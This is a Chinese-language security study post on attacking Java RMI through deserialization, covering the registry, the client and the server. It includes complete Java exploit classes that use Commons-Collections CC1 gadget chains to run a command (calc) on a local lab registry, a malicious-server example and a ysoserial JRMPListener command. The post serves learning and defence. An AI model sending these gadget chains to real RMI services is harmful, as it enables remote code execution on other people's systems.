[https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/)



### 4.1 攻击注册中心
攻击点还是在 <font style="color:#080808;background-color:#ffffff;">RegistryImpl_Skel 代码中的反序列化，</font>

<font style="color:#080808;background-color:#ffffff;">case 的对应关系如下：</font>

+ <font style="color:#080808;background-color:#ffffff;">case0 -- bind</font>

```java
case 0:
String var100;
Remote var103;
try {
    ObjectInput var105 = var2.getInputStream();
    var100 = (String)var105.readObject();
    var103 = (Remote)var105.readObject();
} catch (IOException var94) {
    throw new UnmarshalException("error unmarshalling arguments", var94);
} catch (ClassNotFoundException var95) {
    throw new UnmarshalException("error unmarshalling arguments", var95);
} finally {
    var2.releaseInputStream();
}

var6.bind(var100, var103);

try {
    var2.getResultStream(true);
    break;
} catch (IOException var93) {
    throw new MarshalException("error marshalling return", var93);
}
```

+ <font style="color:#080808;background-color:#ffffff;">case1 -- list</font>
    - <font style="color:#080808;background-color:#ffffff;">list 这里没有 readObject ，无法攻击</font>

```java
case 1:
var2.releaseInputStream();
String[] var99 = var6.list();

try {
    ObjectOutput var102 = var2.getResultStream(true);
    var102.writeObject(var99);
    break;
} catch (IOException var92) {
    throw new MarshalException("error marshalling return", var92);
}
```

+ <font style="color:#080808;background-color:#ffffff;">case2 -- lookup</font>

```java
case 2:
String var98;
try {
    ObjectInput var104 = var2.getInputStream();
    var98 = (String)var104.readObject();
} catch (IOException var89) {
    throw new UnmarshalException("error unmarshalling arguments", var89);
} catch (ClassNotFoundException var90) {
    throw new UnmarshalException("error unmarshalling arguments", var90);
} finally {
    var2.releaseInputStream();
}

Remote var101 = var6.lookup(var98);

try {
    ObjectOutput var9 = var2.getResultStream(true);
    var9.writeObject(var101);
    break;
} catch (IOException var88) {
    throw new MarshalException("error marshalling return", var88);
}
```

+ <font style="color:#080808;background-color:#ffffff;">case3 --  rebind</font>

```java
case 3:
Remote var8;
String var97;
try {
    ObjectInput var11 = var2.getInputStream();
    var97 = (String)var11.readObject();
    var8 = (Remote)var11.readObject();
} catch (IOException var85) {
    throw new UnmarshalException("error unmarshalling arguments", var85);
} catch (ClassNotFoundException var86) {
    throw new UnmarshalException("error unmarshalling arguments", var86);
} finally {
    var2.releaseInputStream();
}

var6.rebind(var97, var8);

try {
    var2.getResultStream(true);
    break;
} catch (IOException var84) {
    throw new MarshalException("error marshalling return", var84);
}
```

+ <font style="color:#080808;background-color:#ffffff;">case4 -- unbind</font>

```java
case 4:
String var7;
try {
    ObjectInput var10 = var2.getInputStream();
    var7 = (String)var10.readObject();
} catch (IOException var81) {
    throw new UnmarshalException("error unmarshalling arguments", var81);
} catch (ClassNotFoundException var82) {
    throw new UnmarshalException("error unmarshalling arguments", var82);
} finally {
    var2.releaseInputStream();
}

var6.unbind(var7);

try {
    var2.getResultStream(true);
    break;
} catch (IOException var80) {
    throw new MarshalException("error marshalling return", var80);
}
```

<font style="color:#080808;background-color:#ffffff;"></font>

#### 4.1.1 bind&rebind
调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链

```java
case 0:
String var100;
Remote var103;
try {
    //首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支，
    ObjectInput var105 = var2.getInputStream();
    //然后进行反序列化
    //第一个对象必须是 String
    var100 = (String)var105.readObject();
    //第二个对象被强转为 Remote
    var103 = (Remote)var105.readObject();
} catch (IOException var94) {
    throw new UnmarshalException("error unmarshalling arguments", var94);
} catch (ClassNotFoundException var95) {
    throw new UnmarshalException("error unmarshalling arguments", var95);
} finally {
    var2.releaseInputStream();
}

var6.bind(var100, var103);

try {
    var2.getResultStream(true);
    break;
} catch (IOException var93) {
    throw new MarshalException("error marshalling return", var93);
}
```



##### EXP：
```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  

import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  

public class AttackRegistryEXP {  
    public static void main(String[] args) throws Exception{  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
        InvocationHandler handler = (InvocationHandler) CC1();  
        //Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用
        //这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数
        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));  
        //向目标 RMI registry 发送请求，触发反序列化
        registry.bind("sTring",remote);  
    }  
    
//下面就是以前分析过的 CC1 链 （TransformedMap 版  ）
    public static Object CC1() throws Exception{  
        Transformer[] transformers = new Transformer[]{  
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","value");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);  
        constructor.setAccessible(true);  
        Object o = constructor.newInstance(Target.class, transformedMap);  
        return o;  
    }  
}
```



首先导入 commons-collections 3.2.1

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.2.1</version>
</dependency>
```



**需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。**



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png)



rebind  和 bind 一样，不再赘述。



#### 4.1.2 lookup&unbind


```java
case 2:
String var98;
try {
    ObjectInput var104 = var2.getInputStream();
    //读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数
    var98 = (String)var104.readObject();
} catch (IOException var89) {
    throw new UnmarshalException("error unmarshalling arguments", var89);
} catch (ClassNotFoundException var90) {
    throw new UnmarshalException("error unmarshalling arguments", var90);
} finally {
    var2.releaseInputStream();
}

//这里调用注册表查找对象，返回 Remote 类型并放在 var101
Remote var101 = var6.lookup(var98);

try {
    ObjectOutput var9 = var2.getResultStream(true);
    var9.writeObject(var101);
    break;
} catch (IOException var88) {
    throw new MarshalException("error marshalling return", var88);
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png)

lookup 只能传入一个 String 类型



分析 lookup 的功能，然后伪造 lookup 代码，达到目的：

```java
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
        try {
            //newCll 构造远程调用对象
            RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

            try {
                //序列化lookup 传入的输入流
                ObjectOutput var3 = var2.getOutputStream();
                var3.writeObject(var1);
            } catch (IOException var18) {
                throw new MarshalException("error marshalling arguments", var18);
            }

            //把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。
            super.ref.invoke(var2);

            Remote var23;
            try {
                ObjectInput var6 = var2.getInputStream();
                var23 = (Remote)var6.readObject();
            } catch (IOException var15) {
                throw new UnmarshalException("error unmarshalling return", var15);
            } catch (ClassNotFoundException var16) {
                throw new UnmarshalException("error unmarshalling return", var16);
            } finally {
                super.ref.done(var2);
            }

            return var23;
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png)

调用 invoke 后就到了客户端请求注册中心的流程：![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png)

##### EXP：
在 bind 的基础上修改：

```java
package com.attack;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.rmi.server.UnicastRef;
import java.io.ObjectOutput;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class AttackRegistryEXP02 {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);

        //通过反射拿到 UnicastRef
        Class<?> clazz = Class.forName("java.rmi.server.RemoteObject");
        Field field = clazz.getDeclaredField("ref");
        field.setAccessible(true);
        UnicastRef ref = (UnicastRef) field.get(registry);

        //从这里开始模拟 lookup 的方式进行伪造方法调用
        //这里手动构建了一次 Registry 远程调用
        Operation[] operations = new Operation[0];
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        //获取调用的输出流
        ObjectOutput var3 = var2.getOutputStream();
        //序列化
        var3.writeObject(CC1());
        //这里执行远程调用触发漏洞
        ref.invoke(var2);
    }

    public static Object CC1() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        return o;
    }
}

```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png)



### 4.2 攻击客户端		
#### 4.2.1 注册中心攻击客户端
> 除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png)



`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 'calc'`

客户端去访问：

```java
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
 
public class Client {
    public static void main(String[] args) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        registry.list();
    }
}
```





但是运行完什么都没有发生。。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png)



##### 后续发现俩个问题，
###### 一是 Java 版本
如果是用CC1链，Java版本低于 1.8.0_65

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png)

当然，高版本可以用 CC6 链绕过也是可以的

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png)

###### 二是运行计算器时因为加了 单引号 '' 而找不到程序
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png)

运行 `calc` `"calc"` 都可以正常弹出

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png)







**根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 `'calc'`，而不是单纯的 `calc`。当我们换成 power shell 时，是可以正确执行的。**





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png)



#### 4.2.2 服务端攻击客户端
服务端攻击客户端，可分俩种情形：

1. <font style="color:rgb(80, 80, 92);">服务端返回Object对象</font>
2. <font style="color:rgb(80, 80, 92);">远程加载对象</font>

##### <font style="color:rgb(80, 80, 92);">服务端返回Object对象</font>
RMI 远程方法调用返回的不一定是一个基础数据类型（比如String  int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。



User 接口，返回 Object 对象

```java
package com;

public interface User extends java.rmi.Remote {
    Object getUser() throws Exception;
}
```

服务端实现 User 接口，返回 CC1 恶意 Object 对象

```java
package com;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;

public class ServerReturnObject extends UnicastRemoteObject implements User  {
    public String name;
    public int age;

    public ServerReturnObject(String name, int age) throws RemoteException {
        super();
        this.name = name;
        this.age = age;
    }

    @Override
    public Object getUser() throws Exception {

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        return handler;
    }
}
```

恶意服务端将恶意对象注册到注册中心

```java
package com;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilClassServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        User liming = new ServerReturnObject("liming",15);
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("user",liming);
    }
}
```

客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象

```java
package com;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        User user = (User)registry.lookup("user");
        user.getUser();
    }
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png)			



##### <font style="color:rgb(80, 80, 92);">远程加载对象</font>
> 《Java 安全漫谈》
>
> codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的
>
> CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。
>
> 如果我们指定 codebase=[http://example.com/](http://example.com/) ，然后加载 org.vulhub.example.Example 类，则
>
> Java虚拟机会下载这个文件 [http://example.com/org/vulhub/example/Example.class](http://example.com/org/vulhub/example/Example.class) ，并作为
>
> Example类的字节码。
>
> RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻
>
> 找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在
>
> 本地没有找到这个类，就会去远程加载codebase中的类。
>
> 这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？
>
> 对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去
>
> CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。
>
> 不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：
>
> + 安装并配置了SecurityManager
> + Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false
>
> 其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：
>
> [https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html](https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html)
>
> [https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html](https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html)
>
> 官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。
>



### 4.3 攻击服务端
这一部分同样是熟悉的 unmarshalValue ,

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png)

**服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化**





























































## 参考文章：
官方文档

[https://docs.oracle.com/javase/tutorial/rmi/overview.html](https://docs.oracle.com/javase/tutorial/rmi/overview.html)

<font style="color:rgb(34, 34, 38);">从懵逼到恍然大悟之Java中RMI的使用</font>

[https://blog.csdn.net/lmy86263/article/details/72594760](https://blog.csdn.net/lmy86263/article/details/72594760)

<font style="color:rgb(51, 51, 51);">JAVA安全基础（四）-- RMI机制</font>

[https://xz.aliyun.com/news/8760](https://xz.aliyun.com/news/8760)

<font style="color:rgb(68, 68, 68);">一文回顾攻击Java RMI方式</font>

[https://www.anquanke.com/post/id/263726#h2-5](https://www.anquanke.com/post/id/263726#h2-5)

Java RMI 攻击由浅入深

[https://su18.org/post/rmi-attack/](https://su18.org/post/rmi-attack/)



[https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/)



[<font style="color:rgb(89, 182, 215);">https://www.cnblogs.com/pihaochen/p/11020596.html</font>](https://www.cnblogs.com/pihaochen/p/11020596.html)

[<font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/9053</font>](https://xz.aliyun.com/t/9053)

[<font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7930</font>](https://xz.aliyun.com/t/7930)

[<font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/6660</font>](https://xz.aliyun.com/t/6660)

[<font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7079</font>](https://xz.aliyun.com/t/7079)

